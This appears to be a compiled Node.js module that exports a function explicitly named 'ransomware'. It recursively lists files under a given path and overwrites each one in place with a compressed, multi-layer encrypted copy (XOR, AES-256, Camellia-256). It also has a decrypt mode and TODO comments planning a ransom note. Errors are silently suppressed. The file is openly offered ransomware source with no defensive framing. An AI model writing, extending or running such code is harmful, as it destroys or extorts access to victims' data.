"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const zlib_1 = __importDefault(require("zlib"));
const fs_1 = __importDefault(require("fs"));
const crypto_1 = __importDefault(require("crypto"));
const path_1 = __importDefault(require("path"));
const removeElementsInWhiteList = (listOfFiles) => {
    const whitelist = [
        "ld-musl-aarch64.so.1",
        "libc.musl-aarch64.so.1",
    ];
    const newList = [];
    for (let i = 0; i < listOfFiles.length; ++i) {
        for (let j = 0; j < whitelist.length; ++j) {
            if (new RegExp(`/${whitelist[j]}`, "gi").test(listOfFiles[i])) {
                break;
            }
            newList.push(listOfFiles[i]);
        }
    }
    return newList;
};
const readdir = (directory) => {
    var _a;
    let fileList = [];
    let files = [];
    try {
        files = fs_1.default.readdirSync(directory);
    }
    catch (err) {
    }
    for (const file of files) {
        const p = path_1.default.join(directory, file);
        try {
            if ((_a = fs_1.default.statSync(p)) === null || _a === void 0 ? void 0 : _a.isDirectory()) {
                fileList = [...fileList, ...(readdir(p))];
            }
            else {
                fileList.push(p);
            }
        }
        catch (err) {
            return fileList;
        }
    }
    return fileList;
};
// Load a file as utf-8 encoding
const loadFile = (filename) => {
    return fs_1.default.readFileSync(filename);
};
const saveToFile = (filename, data) => {
    return fs_1.default.writeFileSync(filename, data);
};
const compressBuffer = (data, speed) => {
    return zlib_1.default.brotliCompressSync(data, {
        params: {
            [zlib_1.default.constants.BROTLI_PARAM_QUALITY]: speed
        }
    });
};
const uncompressBuffer = (data) => {
    return zlib_1.default.brotliDecompressSync(data);
};
const encrypt = (data, password) => {
    let originalPassword = password;
    /* Extra layer of xor encryption to resist post quantum crypto */
    let xorPassword = password;
    let xorPasswordBuffer = Buffer.alloc(data.length);
    do {
        xorPassword = Buffer.from(xorPassword).toString("base64");
    } while (xorPassword.length <= data.length);
    Buffer.from(xorPassword).copy(xorPasswordBuffer);
    for (let i = 0; i < data.length; ++i) {
        data[i] = data[i] ^ xorPasswordBuffer[i];
    }
    /* End of first post quantum protection layer */
    // TODO: Add columnar transposition here
    do {
        password = Buffer.from(password).toString("base64");
    } while (password.length <= 32);
    password = password.substring(0, 32);
    // TODO: Change passwords for derivations
    const iv = crypto_1.default.randomBytes(16);
    const cipher = crypto_1.default.createCipheriv("aes-256-cbc", password, iv);
    const result = Buffer.concat([iv, cipher.update(data), cipher.final()]);
    const iv2 = crypto_1.default.randomBytes(16);
    const cipher2 = crypto_1.default.createCipheriv("camellia-256-cbc", password, iv2);
    const result2 = Buffer.concat([iv2, cipher2.update(result), cipher2.final()]);
    const iv3 = crypto_1.default.randomBytes(16);
    const cipher3 = crypto_1.default.createCipheriv("aes-256-cbc", password, iv3);
    const result3 = Buffer.concat([iv3, cipher3.update(result2), cipher3.final()]);
    // TODO: Add Another layer of post quantum protection here
    // take a byte, reorder it and derivate key? 
    // think about using hashes instead of password
    let hash = crypto_1.default.createHash("sha512").update(originalPassword, "binary").digest("base64");
    let hashBuffer = Buffer.alloc(result3.length);
    do {
        hash = Buffer.from(hash).toString("base64");
    } while (hash.length <= result3.length);
    hashBuffer = Buffer.from(hash.substring(0, result3.length));
    for (let i = 0; i < result3.length; ++i) {
        result3[i] = result3[i] ^ hashBuffer[i];
    }
    return result3;
};
const decrypt = (data, password) => {
    let hash = crypto_1.default.createHash("sha512").update(password, "binary").digest("base64");
    let hashBuffer = Buffer.alloc(data.length);
    do {
        hash = Buffer.from(hash).toString("base64");
    } while (hash.length <= data.length);
    hashBuffer = Buffer.from(hash.substring(0, data.length));
    for (let i = 0; i < data.length; ++i) {
        data[i] = data[i] ^ hashBuffer[i];
    }
    let xorPassword = password;
    do {
        password = Buffer.from(password).toString("base64");
    } while (password.length <= 32);
    password = password.substring(0, 32);
    const iv = data.slice(0, 16);
    const encrypted = data.slice(16);
    const decipher = crypto_1.default.createDecipheriv("aes-256-cbc", password, iv);
    const result = Buffer.concat([decipher.update(encrypted), decipher.final()]);
    const iv2 = result.slice(0, 16);
    const encrypted2 = result.slice(16);
    const decipher2 = crypto_1.default.createDecipheriv("camellia-256-cbc", password, iv2);
    const result2 = Buffer.concat([decipher2.update(encrypted2), decipher2.final()]);
    const iv3 = result2.slice(0, 16);
    const encrypted3 = result2.slice(16);
    const decipher3 = crypto_1.default.createDecipheriv("aes-256-cbc", password, iv3);
    const result3 = Buffer.concat([decipher3.update(encrypted3), decipher3.final()]);
    /* Extra layer of xor dcryption to resist post quantum crypto */
    let xorPasswordBuffer = Buffer.alloc(result3.length);
    do {
        xorPassword = Buffer.from(xorPassword).toString("base64");
    } while (xorPassword.length <= result3.length);
    Buffer.from(xorPassword).copy(xorPasswordBuffer);
    for (let i = 0; i < result3.length; ++i) {
        result3[i] = result3[i] ^ xorPasswordBuffer[i];
    }
    /* End of first post quantum protection layer */
    return result3;
};
/* TODO:
 * Chose Ransomware Speed
 * Chose Folder
 * Chose Strength of cipher
 * Add Note to /path after encryption ends
*/
const ransomware = (options) => {
    options = options.substring(12, options.length);
    const [mode, key, path, speed] = options.split(" ");
    const filesInPath = removeElementsInWhiteList(readdir(path));
    console.log("Encrypting " + filesInPath.length + " files...");
    for (let i = 0; i < filesInPath.length; ++i) {
        console.log(`${i} of ${filesInPath.length} as ${filesInPath[i]} ...`);
        try {
            const fileData = loadFile(`${path}${filesInPath[i]}`);
            if (mode === "e" || mode === "encrypt") {
                const compressedFileDataBuffer = compressBuffer(fileData, +speed);
                const encryptedDataBuffer = encrypt(compressedFileDataBuffer, key);
                saveToFile(`${path}${filesInPath[i]}`, encryptedDataBuffer);
            }
            else {
                const decryptedDataBuffer = decrypt(fileData, key);
                const decompressedFileDataBuffer = uncompressBuffer(decryptedDataBuffer);
                saveToFile(`${path}${filesInPath[i]}`, decompressedFileDataBuffer);
            }
        }
        catch (err) {
            // silent error
        }
    }
    return path + " files " + ((mode === "e" || mode === "encrypt") ? "encrypted" : "decrypted");
};
exports.default = ransomware;
